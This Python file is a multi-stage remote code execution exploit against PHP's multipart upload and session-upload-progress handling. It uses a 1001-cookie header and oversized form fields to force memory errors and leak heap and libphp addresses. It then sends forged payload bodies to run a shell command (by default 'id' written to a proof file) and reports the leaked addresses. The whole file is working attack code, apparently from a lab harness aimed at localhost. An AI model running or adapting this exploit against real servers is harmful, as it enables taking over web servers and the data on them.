import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 os.pardir, "exploits"))
import os, sys, time
os.environ.setdefault("PROFILE", os.environ.get("PROFILE3", "off"))
import exploit as E
import worker
import default_rce as D
import def_rce as N

# The generic display_errors=On stage1 needs no per-limit allocator calibration:
# the 1001-cookie warning sets headers_sent, the fill just has to exceed the
# limit before the big field's read OOMs.  (fill count, fill size, big size)
DD_FILL = {
    "off": (6, 12 << 20, 64 << 20),
    "off256": (40, 4 << 20, 128 << 20),
    "off512": (90, 4 << 20, 256 << 20),
    "off1g": (200, 4 << 20, 512 << 20),
}
_f = DD_FILL.get(N.PROFILE, DD_FILL["off"])
URL = os.environ.get(
    "URL", "http://127.0.0.1:%d/index.php" % worker.target_port())
PROOF = os.environ.get("PROOF", os.path.join(worker.out_dir(), "pd"))
CMD = os.environ.get("CMD", "id>/srv/out/pd")
NFILL = int(os.environ.get("NFILL", str(_f[0])))
FILLSZ = int(os.environ.get("FILLSZ", str(_f[1])))
BIGLEN = int(os.environ.get("BIGLEN", str(_f[2])))
S3A = os.environ.get("S3A", "")
if os.path.exists(PROOF):
    os.unlink(PROOF)
N.CMD = CMD
t = E.Target(URL, timeout=900.0, verbose=False)


def stage1_a():
    parts = [{"name": "PHPSESSID", "data": b"\x00"},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
             {"name": "e000" + "".join(f"[{k:02d}]" for k in range(60)),
              "filename": "", "data": b""}]
    for k in range(NFILL):
        parts.append({"name": f"p{k}", "data": b"P" * FILLSZ})
    parts.append({"name": "big", "data": b"B" * BIGLEN})
    return parts


cookie_hdr = "; ".join(f"c{i:03x}=1" for i in range(1001))
abody = E.build_multipart(stage1_a(), b"S" * 17)
print("S1 A body", len(abody), flush=True)
try:
    r = N.post_chunked(URL, abody, b"S" * 17, read_cap=1 << 20,
                       timeout=900.0, extra_headers={"Cookie": cookie_hdr})
    print("S1 A resp", len(r), flush=True)
except Exception as e:
    print("S1 A err", e, flush=True)
time.sleep(0.4)

b = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for j in range(48):
    b.append({"name": f"{5 + j // 16}[{100 + (j % 16)}]", "data": b"x"})
b.append({"name": "h000" + "".join(f"[{k:02d}]" for k in range(46)),
          "data": b"x"})
forge = bytearray(b"A" * 639)
import struct
struct.pack_into("<Q", forge, 0x110, 0x40000)
b.append({"name": "1999", "data": bytes(forge)})
try:
    braw = t.post(E.build_multipart(b, b"B" * 10), b"B" * 10,
                  read_cap=9 << 20, timeout=300.0)
    print("S1 B resp", len(braw), flush=True)
except Exception as e:
    print("S1 B err", e, flush=True)
    sys.exit(1)
cookie = E.parse_cookie(braw)
chunk, libphp, n = D.parse_bases(cookie)
if not chunk or not libphp or n < 4:
    print("LEAK_FAILED", flush=True)
    sys.exit(1)

bp, htdata, zif = N.stage3_b_body(chunk, libphp)
a = N.stage3_a_body()
try:
    if N.S3_DENSE or N.S3_EARLY_FORM or N.S3_FORCE_EARLY:
        r = N.post_chunked(URL, E.build_multipart(a, b"S" * 17), b"S" * 17,
                           timeout=900.0)
    else:
        r = t.post(E.build_multipart(a, b"S" * 17), b"S" * 17,
                   read_cap=1 << 20, timeout=300.0)
    print("S3 A resp", len(r), flush=True)
except Exception as e:
    print("S3 A err", e, flush=True)
time.sleep(0.4)
try:
    r = t.post(E.build_multipart(bp, b"B" * 10), b"B" * 10,
               read_cap=1 << 20, timeout=120.0)
    print("S3 B resp", len(r), flush=True)
except Exception as e:
    print("S3 B err", e, flush=True)
time.sleep(0.8)
try:
    proof = open(PROOF, "rb").read().decode("latin1").strip()
except OSError:
    proof = ""
print(f"R0={chunk + N.R0_OFF:#x} htdata={htdata:#x} zif={zif:#x}", flush=True)
print("PROOF:", proof, flush=True)
